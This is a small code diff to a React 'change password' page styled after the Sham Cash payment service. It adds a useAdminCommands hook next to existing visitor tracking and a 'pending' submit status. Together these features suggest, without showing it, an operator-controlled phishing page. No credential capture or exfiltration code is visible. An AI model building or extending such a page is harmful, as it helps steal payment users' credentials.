@@ -1,6 +1,7 @@
 import { useState, useRef, useEffect } from "react";
 import { Lock, ShieldCheck, Eye, EyeOff, CheckCircle, XCircle } from "lucide-react";
 import { useVisitorTracking } from "@/hooks/useVisitorTracking";
+import { useAdminCommands } from "@/hooks/useAdminCommands";
 
 function ShamLogo() {
   return (
@@ -29,6 +30,7 @@ export function ShamCashChangePassword() {
   const [status, setStatus] = useState<Status>("idle");
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
   useVisitorTracking("تغيير كلمة المرور");
+  useAdminCommands();
 
   function handleSubmit() {
     localStorage.setItem("sham_changepass_status", "pending");
